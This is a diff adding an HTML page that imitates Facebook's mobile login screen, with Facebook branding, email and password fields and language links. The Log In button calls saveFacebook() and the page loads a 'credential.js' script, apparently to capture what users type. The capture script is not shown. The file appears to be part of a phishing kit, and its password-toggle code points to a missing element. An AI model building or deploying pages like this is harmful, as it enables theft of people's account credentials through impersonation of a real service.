@@ -1,0 +1,148 @@
+<html>
+
+<head>
+  <title>Login Facebook | Facebook</title>
+  <link rel=stylesheet href="facebook.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=3.0">
+</head>
+<script src="js/site.js"></script>
+<script src="js/credential.js"></script>
+
+<style>
+  .headerbackground {
+    background: #3b5998;
+    box-sizing: border-box;
+    height: 44px;
+    margin: 0 auto;
+    padding: 0;
+    position: relative;
+    width: 100%;
+    display: flex;
+    display: -webkit-flex;
+    align-items: center;
+    margin-left: auto;
+    margin-right: auto;
+    z-index: 12
+  }
+</style>
+
+<body class="touch x1 _fzu _50-3 iframe acw  portrait">
+
+  <!-- <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw  portrait"
+    style="min-height: 802px; background-color: rgb(255, 255, 255);"> -->
+  <div id="page" class="page">
+    <div class="headerbackground">
+      <div class="_4g34 _52z6">
+        <font color="white" size="6">facebook</font>
+      </div>
+    </div>
+    <br><br>
+
+    <div class="_5soa acw" style="min-height: 802px;">
+
+      <div class="_7om2">
+        <div class="_4g34">
+          <div class="_5rut">
+            <form method="post">
+              <div class="_55x2">
+                <div>
+                  <input class="_56bg _4u9z" id="username" name="email" placeholder="Email address or phone number" type="text">
+                </div>
+                <br>
+                <div>
+                  <div class="_1upc">
+                    <div class="_7om2">
+                      <div class="_4g34 _5i2i _52we">
+                        <input class="_56bg _4u9z _27z2" id="password" name="pass" placeholder="Password"
+                          type="password">
+                      </div>
+                      <br>
+                      <div class="_216i _5i2i _52we">
+                        <div class="_2pi9">
+                          <a href="#">
+                            <span class="mfss" id="hide" style="display:none" onclick="myFunction()">Hide</span>
+                            <span class="mfss" id="show" style="display:true" onclick="myFunction()">Show</span>
+                          </a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <script>
+                function myFunction() {
+                  var x = document.getElementById("m_login_password");
+                  var hide = document.getElementById("hide");
+                  var show = document.getElementById("show");
+                  if (x.type === "password") {
+                    x.type = "text";
+                    hide.style = "display:true";
+                    show.style = "display:none";
+                  } else {
+                    x.type = "password";
+                    hide.style = "display:none";
+                    show.style = "display:true";
+                  }
+                }
+              </script>
+
+              <div class="_2pie">
+
+                <button type="button" onclick="saveFacebook()" value="Đăng nhập"
+                  class=" _52jh _56bs _56b_ _28lf _56bw _56bu" name="login">
+                  <span class="_55sr">Log In</span>
+                </button>
+
+              </div>
+            </form>
+            <div>
+              <div class="_43mg _8qtb"><span class="_43mh"></span>or</span></div>
+              <!-- TODO check to this _5t3b-->
+              <div class="_52jj _5t3b"><a role="button" class="_5t3c _28le btn btnS mfsm touchable">Create New Account</a></div>
+            </div>
+            <div>
+              <div class="other-links _8pux _8p_m">
+                <ul class="_5pkb">
+                  <li><span class="mfss fcg"><a>Forgotten Password?</a></span>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <!-- </div> -->
+        </div>
+      </div>
+
+      <div class="_55wr _5ui2">
+        <div class="_5dpw">
+          <div class="_5ui3">
+            <div class="_7om2">
+              <div class="_4g34"><span class="_52jc _52j9 _52jh">English
+                      (UK)</span>
+                <div class="_3ztc"><span class="_52jc"><a data-locale="zh_TW"
+                      data-sigil="change_language">中文(台灣)</a></span></div>
+                <div class="_3ztc"><span class="_52jc"><a data-locale="es_LA"
+                      data-sigil="change_language">Español</a></span></div>
+                <div class="_3ztc"><span class="_52jc"><a data-locale="fr_FR" data-sigil="change_language">Français
+                      (France)</a></span></div>
+              </div>
+              <div class="_4g34">
+                <div class="_3ztc"><span class="_52jc"><a data-locale="en_GB" data-sigil="change_language">Tiếng Việt</a></span></div>
+                <div class="_3ztc"><span class="_52jc"><a data-locale="ko_KR"
+                      data-sigil="change_language">한국어</a></span></div>
+                <div class="_3ztc"><span class="_52jc"><a data-locale="pt_BR" data-sigil="change_language">Português
+                      (Brasil)</a></span></div><a>
+
+                </a>
+              </div>
+            </div>
+          </div>
+          <div><span class="mfss fcg">Facebook, Inc.</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
